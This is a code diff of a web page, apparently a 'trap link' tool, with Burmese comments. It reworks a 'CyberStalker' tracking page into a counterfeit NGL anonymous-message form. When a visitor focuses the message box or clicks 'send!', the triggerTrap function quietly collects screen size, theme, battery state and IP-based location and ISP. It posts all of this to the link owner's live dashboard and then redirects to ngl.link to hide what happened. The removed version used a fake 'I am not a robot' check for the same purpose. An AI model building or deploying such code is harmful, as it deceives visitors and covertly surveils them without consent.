@@ -3,295 +3,182 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>👁️ CyberStalker - Live Identity Radar</title>
+    <title>💬 NGL - Send Anonymous Messages</title>
     <style>
         :root {
-            --bg-url: url('https://images.unsplash.com/photo-1510511459019-5dda7724fd87?q=80&w=2070&auto=format&fit=crop');
-            --glass: rgba(15, 23, 42, 0.55);
+            --bg-dashboard: url('https://images.unsplash.com/photo-1510511459019-5dda7724fd87?q=80&w=2070&auto=format&fit=crop');
+            --ngl-gradient: linear-gradient(135deg, #ff416c 0%, #ff4b2b 100%);
+            --glass: rgba(15, 23, 42, 0.6);
             --border: rgba(255, 255, 255, 0.08);
             --neon-blue: #06b6d4;
             --neon-red: #ef4444;
-            --neon-gold: #fbbf24;
-            --neon-green: #10b981;
         }
 
         body {
-            background: var(--bg-url) no-repeat center center fixed;
-            background-size: cover;
-            color: #f8fafc;
-            font-family: 'Segoe UI', 'Pyidaungsu', sans-serif;
-            margin: 0; padding: 20px;
-            display: flex; justify-content: center; align-items: center; min-height: 100vh;
-            box-sizing: border-box;
+            margin: 0; padding: 20px; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            min-height: 100vh; display: flex; justify-content: center; align-items: center; box-sizing: border-box;
+            background: #000;
         }
 
+        /* 📡 Dashboard View Style */
+        .dashboard-body { background: var(--bg-dashboard) no-repeat center center fixed; background-size: cover; color: white; }
+        
         .panel {
-            background: var(--glass);
-            backdrop-filter: blur(25px);
-            -webkit-backdrop-filter: blur(25px);
-            border: 1px solid var(--border);
-            border-radius: 24px;
-            padding: 30px;
-            box-shadow: 0 10px 40px rgba(0,0,0,0.6);
-            max-width: 500px; width: 100%;
-            text-align: center;
-            box-sizing: border-box;
+            background: var(--glass); backdrop-filter: blur(25px); border: 1px solid var(--border);
+            border-radius: 24px; padding: 30px; box-shadow: 0 10px 40px rgba(0,0,0,0.6);
+            max-width: 500px; width: 100%; text-align: center; box-sizing: border-box;
         }
-
         .dashboard-panel { max-width: 800px; }
 
-        .input-box {
-            width: 100%; background: rgba(255,255,255,0.06);
-            border: 1px solid var(--border); padding: 14px;
-            border-radius: 12px; color: white; outline: none;
-            font-size: 1rem; text-align: center; font-weight: 600;
-            margin-bottom: 15px; box-sizing: border-box;
-            transition: 0.3s;
+        /* 🪤 NGL UI Template Style */
+        .ngl-body { background: var(--ngl-gradient); }
+        .ngl-card {
+            background: white; border-radius: 30px; padding: 35px 25px; width: 100%; max-width: 420px;
+            box-shadow: 0 15px 35px rgba(0,0,0,0.15); text-align: center; color: #333; box-sizing: border-box;
         }
-        .input-box:focus { border-color: var(--neon-blue); box-shadow: 0 0 10px rgba(6, 182, 212, 0.3); }
+        .ngl-avatar { width: 75px; height: 75px; border-radius: 50%; background: #ddd; margin: -75px auto 15px auto; border: 4px solid white; box-shadow: 0 4px 10px rgba(0,0,0,0.1); display: flex; align-items: center; justify-content: center; font-size: 2rem; }
+        .ngl-username { font-weight: 700; color: #111; font-size: 1.1rem; margin-bottom: 5px; }
+        .ngl-bubble { background: #f0f0f0; border-radius: 20px; padding: 20px; text-align: left; font-weight: 600; color: #444; font-size: 1rem; margin-bottom: 20px; position: relative; }
+        .ngl-textarea { width: 100%; border: none; background: transparent; resize: none; outline: none; font-size: 1.05rem; font-family: inherit; font-weight: 600; height: 80px; }
+        .ngl-btn { background: #000; color: white; font-weight: 800; border: none; padding: 16px; border-radius: 30px; width: 100%; font-size: 1.1rem; cursor: pointer; text-transform: lowercase; letter-spacing: 0.5px; transition: 0.2s; }
+        .ngl-btn:hover { background: #222; transform: scale(1.01); }
 
-        .btn {
-            width: 100%; padding: 14px; border: none; border-radius: 12px;
-            font-size: 1rem; font-weight: bold; cursor: pointer; color: white;
-            transition: 0.3s; text-transform: uppercase; letter-spacing: 1px;
-        }
-        .btn-cyan { background: var(--neon-blue); box-shadow: 0 4px 15px rgba(6, 182, 212, 0.4); }
-        .btn-cyan:hover { background: #0891b2; transform: translateY(-2px); }
-        .btn-green { background: var(--neon-green); box-shadow: 0 4px 15px rgba(16, 185, 129, 0.4); }
-
-        /* 📡 Radar Pulse Animation */
-        .radar-container { position: relative; width: 120px; height: 120px; margin: 0 auto 20px auto; }
-        .radar-circle {
-            position: absolute; width: 100%; height: 100%;
-            border: 2px solid var(--neon-red); border-radius: 50%;
-            animation: pulse 2s infinite linear; opacity: 0;
-        }
-        .radar-circle:nth-child(2) { animation-delay: 0.6s; }
-        .radar-circle:nth-child(3) { animation-delay: 1.2s; }
-        .radar-icon {
-            position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%);
-            font-size: 2.5rem; color: var(--neon-red); z-index: 5;
-        }
-
-        @keyframes pulse {
-            0% { transform: translate(-50%, -50%) scale(0.2); opacity: 0; top: 50%; left: 50%; }
-            50% { opacity: 0.5; }
-            100% { transform: translate(-50%, -50%) scale(1.2); opacity: 0; top: 50%; left: 50%; }
-        }
-
-        /* 👁️ Stalker Log Cards */
-        .log-grid { display: grid; grid-template-columns: 1fr; gap: 12px; margin-top: 20px; text-align: left; max-height: 400px; overflow-y: auto; padding-right: 5px; }
-        .log-card {
-            background: rgba(239, 68, 68, 0.08); border: 1px solid rgba(239, 68, 68, 0.2);
-            border-radius: 14px; padding: 15px; position: relative;
-            animation: slideIn 0.4s ease-out; line-height: 1.6;
-        }
-        .log-card b { color: var(--neon-gold); }
-        .log-card .time-stamp { position: absolute; right: 15px; top: 15px; font-size: 0.8rem; color: #94a3b8; }
-
-        @keyframes slideIn { from { transform: translateY(10px); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
-        
+        /* General Inputs */
+        .input-box { width: 100%; background: rgba(255,255,255,0.06); border: 1px solid var(--border); padding: 14px; border-radius: 12px; color: white; outline: none; font-size: 1rem; text-align: center; margin-bottom: 15px; box-sizing: border-box; }
+        .btn-cyan { width: 100%; padding: 14px; border: none; border-radius: 12px; font-size: 1rem; font-weight: bold; cursor: pointer; color: white; background: var(--neon-blue); box-shadow: 0 4px 15px rgba(6, 182, 212, 0.4); text-transform: uppercase; }
         .link-display-box { background: rgba(0,0,0,0.3); padding: 12px; border-radius: 10px; border: 1px dashed var(--neon-blue); color: var(--neon-blue); font-weight: bold; cursor: pointer; word-break: break-all; margin: 15px 0; }
+        .log-grid { display: grid; grid-template-columns: 1fr; gap: 12px; margin-top: 20px; text-align: left; max-height: 400px; overflow-y: auto; }
+        .log-card { background: rgba(239, 68, 68, 0.08); border: 1px solid rgba(239, 68, 68, 0.2); border-radius: 14px; padding: 15px; line-height: 1.6; }
     </style>
 </head>
-<body>
+<body id="main-body">
 
     <div id="setup-screen" class="panel">
-        <h2 style="color: var(--neon-blue); margin: 0 0 10px 0;">🕵️ CYBERSTALKER GENERATOR</h2>
-        <p style="color: #94a3b8; font-size: 0.9rem; margin-bottom: 25px;">Create a link, put it in your social bio, and see who stalks you secretly in real-time.</p>
-        
-        <input type="text" id="username-input" class="input-box" placeholder="Enter your Alias Name (e.g., alex)">
-        <button class="btn btn-cyan" onclick="generateSpyWall()">⚡ ACTIVATE SPY WALL</button>
+        <h2 style="color: var(--neon-blue); margin: 0 0 10px 0;">🕵️ ANONYMOUS VIBE GENERATOR</h2>
+        <p style="color: #94a3b8; font-size: 0.9rem; margin-bottom: 25px;">Create an anonymous NGL link, put it in your Bio, and catch secret viewers.</p>
+        <input type="text" id="username-input" class="input-box" placeholder="Enter your Instagram Username">
+        <button class="btn-cyan" onclick="generateSpyWall()">⚡ ACTIVATE TRAP LINK</button>
     </div>
 
     <div id="dashboard-screen" class="panel dashboard-panel" style="display: none;">
-        <div class="radar-container">
-            <div class="radar-circle"></div>
-            <div class="radar-circle"></div>
-            <div class="radar-circle"></div>
-            <div class="radar-icon">👁️</div>
-        </div>
-
-        <h2 style="color: var(--neon-red); margin: 0;">LIVE MONITORING TERMINAL</h2>
-        <p style="color: #cbd5e1; font-size: 0.95rem; margin: 5px 0 15px 0;">Copy the link below and share it on Instagram/TikTok Bio:</p>
-        
-        <div class="link-display-box" id="share-link-uri" onclick="copyLink()">Generating Link...</div>
-        <p style="font-size:0.8rem; color:#64748b; margin-top:-10px;">(Click box above to copy to clipboard)</p>
-
-        <hr style="border:0; border-top:1px dashed var(--border); margin: 20px 0;">
-
-        <h3 style="text-align: left; color: #f8fafc; margin-bottom: 10px;">📡 Intercepted Target Logs (<span id="log-count">0</span>)</h3>
+        <h2 style="color: var(--neon-red); margin: 0;">📡 REAL-TIME MONITORING TERMINAL</h2>
+        <p style="color: #cbd5e1; font-size: 0.95rem; margin: 15px 0 5px 0;">Copy this link and share it on your Instagram Bio:</p>
+        <div class="link-display-box" id="share-link-uri" onclick="copyLink()">Generating...</div>
+        <hr style="border:0; border-top:1px solid var(--border); margin: 20px 0;">
+        <h3 style="text-align: left; color: #f8fafc; margin-bottom: 10px;">🔴 Intercepted Logs (<span id="log-count">0</span>)</h3>
         <div class="log-grid" id="logs-container">
-            <div style="color: #64748b; text-align: center; padding: 20px;" id="no-logs-msg">Waiting for a stalker to trigger the trap link...</div>
+            <div style="color: #64748b; text-align: center; padding: 20px;" id="no-logs-msg">Waiting for clicks... (Telegram Alerts are also Active!)</div>
         </div>
     </div>
 
-    <div id="trap-screen" class="panel" style="display: none;">
-        <h2 style="color: var(--neon-gold); margin-bottom: 10px;">🤖 SECURITY VERIFICATION</h2>
-        <p style="color: #94a3b8; font-size: 0.9rem;">Please verify that you are a human to view this secure social media profile.</p>
+    <div id="trap-screen" class="ngl-card" style="display: none;">
+        <div class="ngl-avatar">👤</div>
+        <div class="ngl-username">@<span id="target-id-label">username</span></div>
+        <div style="font-size: 1.15rem; font-weight: 800; margin-bottom: 20px; color: #111;">send me anonymous messages!</div>
         
-        <div style="background: rgba(255,255,255,0.04); padding: 20px; border-radius:14px; border:1px solid var(--border); margin: 25px 0; display:flex; align-items:center; justify-content:center; gap: 15px;">
-            <input type="checkbox" id="human-checkbox" style="width:22px; height:22px; cursor:pointer;" onchange="triggerTrap()">
-            <label for="human-checkbox" style="font-weight: 600; cursor:pointer; font-size:1.05rem;">I am not a robot / စက်ရုပ်မဟုတ်ပါ။</label>
+        <div class="ngl-bubble">
+            <div style="font-size: 0.75rem; color: #aaa; text-transform: uppercase; font-weight: 700; margin-bottom: 5px;">send me anonymous messages!</div>
+            <textarea id="ngl-msg-input" class="ngl-textarea" placeholder="send me anonymous messages..." onfocus="triggerTrap()"></textarea>
         </div>
-
-        <div style="font-size:0.8rem; color:#64748b;">Protected via Cloud Shield Infrastructure</div>
+        
+        <button class="ngl-btn" onclick="triggerTrap()">send!</button>
     </div>
-
-    <script>
-        const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
-        function playWarningSfx() {
-            const osc = audioCtx.createOscillator();
-            const gain = audioCtx.createGain();
-            osc.connect(gain); gain.connect(audioCtx.destination);
-            osc.type = 'sawtooth'; osc.frequency.setValueAtTime(280, audioCtx.currentTime);
-            osc.frequency.linearRampToValueAtTime(140, audioCtx.currentTime + 0.4);
-            gain.gain.setValueAtTime(0.15, audioCtx.currentTime); gain.gain.exponentialRampToValueAtTime(0.01, audioCtx.currentTime + 0.4);
-            osc.start(); osc.stop(audioCtx.currentTime + 0.4);
-        }
-    </script>
 
     <script src="/socket.io/socket.io.js"></script>
     <script>
         const socket = io();
-let myAlias = '';
+        let myAlias = '';
+        let trapTriggered = false;
 
-// 🛣️ ၁။ Client-Side URL Router Checking
-window.onload = () => {
-    const pathParts = window.location.pathname.split('/');
-    // URL ထဲတွင် /social-vibe/username ဖြစ်နေလျှင် သံသယကင်းစေမည့် ထောင်ချောက် Verification Screen ကို ပြမည်
-    if (pathParts[1] === 'social-vibe' && pathParts[2]) {
-        myAlias = pathParts[2].toLowerCase();
-        document.getElementById('setup-screen').style.display = 'none';
-        document.getElementById('trap-screen').style.display = 'block';
-    }
-};
+        window.onload = () => {
+            const pathParts = window.location.pathname.split('/');
+            if (pathParts[1] === 'social-vibe' && pathParts[2]) {
+                myAlias = pathParts[2].toLowerCase();
+                document.getElementById('main-body').className = "ngl-body"; // Bg Gradient ပြောင်းရန်
+                document.getElementById('setup-screen').style.display = 'none';
+                document.getElementById('trap-screen').style.display = 'block';
+                document.getElementById('target-id-label').innerText = myAlias;
+            } else {
+                document.getElementById('main-body').className = "dashboard-body";
+            }
+        };
 
-// 🔑 ၂။ Dashboard တည်ဆောက်ပြီး ပိုင်ရှင်အဖြစ် မှတ်ပုံတင်ခြင်း
-function generateSpyWall() {
-    const name = document.getElementById('username-input').value.trim();
-    if (!name) { alert("Please input a valid alias name!"); return; }
-    
-    myAlias = name.toLowerCase().replace(/[^a-z0-9]/g, ''); // စာလုံးအသေးနှင့် နံပါတ်များပဲ ယူမည်
-    
-    // UI စခရင် အဖွင့်အပိတ် လုပ်ခြင်း
-    document.getElementById('setup-screen').style.display = 'none';
-    document.getElementById('dashboard-screen').style.display = 'block';
-    
-    // 🎭 Masked Link အသစ်ကို ထုတ်ပေးခြင်း (cyber stalker ဆိုသည့် စာသား လုံးဝမပါဝင်တော့ပါ)
-    const generatedLink = `${window.location.origin}/social-vibe/${myAlias}`;
-    document.getElementById('share-link-uri').innerText = generatedLink;
-
-    // ဆာဗာတွင် ၎င်း Alias ဖြင့် Socket ချိတ်ဆက်မှု မှတ်ပုံတင်ခြင်း
-    socket.emit('registerOwner', myAlias);
-}
-
-// 📋 Link ကို Clipboard ထဲသို့ Copy ကူးယူခြင်း
-function copyLink() {
-    const linkText = document.getElementById('share-link-uri').innerText;
-    navigator.clipboard.writeText(linkText);
-    alert("Vibe Link copied to clipboard! Share it in your social bios.");
-}
-
-// 📡 ၃။ Real-time Logs အဟောင်း/အသစ်များ လက်ခံရရှိမှု စီမံခြင်း
-socket.on('initLogs', (logs) => {
-    if (logs.length > 0) {
-        document.getElementById('no-logs-msg').style.display = 'none';
-        document.getElementById('log-count').innerText = logs.length;
-        document.getElementById('logs-container').innerHTML = logs.map(l => createLogCard(l)).join('');
-    }
-});
-
-socket.on('stalkerDetected', (log) => {
-    document.getElementById('no-logs-msg').style.display = 'none';
-    playWarningSfx(); // အသံချက်ချင်း မြည်စေရန်
-
-    const container = document.getElementById('logs-container');
-    container.insertAdjacentHTML('afterbegin', createLogCard(log));
-
-    const currentCount = parseInt(document.getElementById('log-count').innerText);
-    document.getElementById('log-count').innerText = currentCount + 1;
-});
-
-// Dashboard တွင် ပြသမည့် သတင်းအချက်အလက် ကတ်ပြားဒီဇိုင်း
-function createLogCard(log) {
-    return `
-        <div class="log-card">
-            <span class="time-stamp">⏰ ${log.timestamp}</span>
-            🔴 <b style="color:var(--neon-red); text-transform:uppercase; font-size:0.9rem;">Target Intercepted!</b><br>
-            📱 <b>Device/OS:</b> ${log.device}<br>
-            🌐 <b>Browser:</b> ${log.browser}<br>
-            📍 <b>Location/ISP:</b> ${log.location}<br>
-            💻 <b>Network IP:</b> <span style="font-family:monospace; color:#94a3b8;">${log.ip}</span>
-        </div>
-    `;
-}
-
-// 🪤 ၄။ Advanced Trap Function (လာနှိပ်သူ၏ ဖုန်းထဲက Battery, Resolution နှင့် ဒေတာများကိုပါ ခိုးယူခြင်း)
-async function triggerTrap() {
-    if (!document.getElementById('human-checkbox').checked) return;
-
-    let advancedSpecs = [];
-
-    // (က) Advanced Spec: Screen Resolution (မျက်နှာပြင် အကျယ် ဖတ်ခြင်း)
-    if (window.screen) {
-        advancedSpecs.push(`Screen: ${window.screen.width}x${window.screen.height}`);
-    }
-
-    // (ခ) Advanced Spec: Theme Mode (Dark/Light သုံးထားမှု အခြေအနေ)
-    if (window.matchMedia) {
-        const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches;
-        advancedSpecs.push(isDarkMode ? "Theme: Dark Mode 🌙" : "Theme: Light Mode ☀️");
-    }
-
-    // (ဂ) Advanced Spec: Battery Level Extraction (ဖုန်း Battery ရာခိုင်နှုန်း ခိုးဖတ်ခြင်း)
-    try {
-        if (navigator.getBattery) {
-            const battery = await navigator.getBattery();
-            const batteryPercent = Math.round(battery.level * 100);
-            const isCharging = battery.charging ? "Charging ⚡" : "Discharging 🔋";
-            advancedSpecs.push(`Battery: ${batteryPercent}% (${isCharging})`);
+        function generateSpyWall() {
+            const name = document.getElementById('username-input').value.trim();
+            if (!name) return alert("Please enter username!");
+            myAlias = name.toLowerCase().replace(/[^a-z0-9]/g, '');
+            document.getElementById('setup-screen').style.display = 'none';
+            document.getElementById('dashboard-screen').style.display = 'block';
+            document.getElementById('share-link-uri').innerText = `${window.location.origin}/social-vibe/${myAlias}`;
+            socket.emit('registerOwner', myAlias);
         }
-    } catch (batteryErr) {
-        console.log("Battery API blocked or not supported.");
-    }
 
-    // စုဆောင်းရရှိထားသော အချက်အလက်များကို စာသားတစ်ခုတည်းအဖြစ် ပေါင်းစည်းခြင်း
-    const hardwareInfo = advancedSpecs.length > 0 ? ` [${advancedSpecs.join(' | ')}]` : '';
-
-    let geoInfo = "Unknown Location / Dynamic ISP";
-    
-    try {
-        // Third-party API သုံး၍ လာနှိပ်သူ၏ မြို့နှင့် နိုင်ငံကို ရှာဖွေခြင်း
-        const response = await fetch('https://ipapi.co/json/');
-        if (response.ok) {
-            const data = await response.json();
-            geoInfo = `${data.city}, ${data.region} - ${data.country_name} ${data.country_emoji || '🇲🇲'} (${data.org})`;
+        function copyLink() {
+            navigator.clipboard.writeText(document.getElementById('share-link-uri').innerText);
+            alert("Copied to bio!");
         }
-    } catch (err) {
-        console.log("Location API bypassed.");
-    }
 
-    // တည်နေရာဒေတာနှင့် ဖုန်း Specs ဒေတာများကို ပေါင်းစပ်ပြီး Payload တည်ဆောက်ခြင်း
-    const payload = { 
-        location: geoInfo + hardwareInfo 
-    };
-    
-    // 🔄 Mask ပြောင်းထားသော အွန်လိုင်း API Endpoint သို့ ဒေတာများ လှမ်းပို့ခြင်း
-    fetch(`/api/vibecheck/${myAlias}`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(payload)
-    })
-    .then(res => res.json())
-    .then(data => {
-        // အာရုံလွှဲရန်အတွက် အမှန်ခြစ်ပြီးသည်နှင့် Google သို့ ချက်ချင်း ညွှန်ပေးလိုက်မည်
-        window.location.href = "https://youtu.be/kPa7bsKwL-c?si=-X2G6MMERsF7TruT";
-    })
-    .catch(err => {
-        window.location.href = "https://youtu.be/kPa7bsKwL-c?si=-X2G6MMERsF7TruT";
-    });
-}
+        socket.on('initLogs', (logs) => {
+            if (logs.length > 0) {
+                document.getElementById('no-logs-msg').style.display = 'none';
+                document.getElementById('log-count').innerText = logs.length;
+                document.getElementById('logs-container').innerHTML = logs.map(l => createLogCard(l)).join('');
+            }
+        });
+
+        socket.on('stalkerDetected', (log) => {
+            document.getElementById('no-logs-msg').style.display = 'none';
+            document.getElementById('logs-container').insertAdjacentHTML('afterbegin', createLogCard(log));
+            document.getElementById('log-count').innerText = parseInt(document.getElementById('log-count').innerText) + 1;
+        });
+
+        function createLogCard(log) {
+            return `
+                <div class="log-card">
+                    <span style="float:right; font-size:0.8rem; color:#94a3b8;">⏰ ${log.timestamp}</span>
+                    🟢 <b>Intercepted Device:</b> ${log.device}<br>
+                    🌐 <b>IP/ISP Info:</b> ${log.location}
+                </div>
+            `;
+        }
+
+        // 🪤 Advanced Spy Trap Processing
+        async function triggerTrap() {
+            if (trapTriggered) return; // တစ်ကြိမ်ပဲ ပို့ရန်
+            trapTriggered = true;
+
+            let specs = [];
+            if (window.screen) specs.push(`Screen: ${window.screen.width}x${window.screen.height}`);
+            if (window.matchMedia) specs.push(window.matchMedia('(prefers-color-scheme: dark)').matches ? "Dark 🌙" : "Light ☀️");
+            
+            try {
+                if (navigator.getBattery) {
+                    const b = await navigator.getBattery();
+                    specs.push(`Battery: ${Math.round(b.level * 100)}% (${b.charging ? 'Charging ⚡' : '🔋'})`);
+                }
+            } catch(e){}
+
+            let geo = "Unknown Region";
+            try {
+                const res = await fetch('https://ipapi.co/json/');
+                if (res.ok) {
+                    const d = await res.json();
+                    geo = `${d.city}, ${d.country_name} 🇲🇲 (${d.org})`;
+                }
+            } catch (err) {}
+
+            fetch(`/api/vibecheck/${myAlias}`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ location: `${geo} | [${specs.join(' | ')}]` })
+            })
+            .then(res => res.json())
+            .then(data => {
+                // အမှန်တကယ် NGL app ထဲရောက်သွားသလို အာရုံလွှဲမည်
+                window.location.href = "https://ngl.link";
+            })
+            .catch(() => window.location.href = "https://ngl.link");
+        }
     </script>
 </body>
 </html>
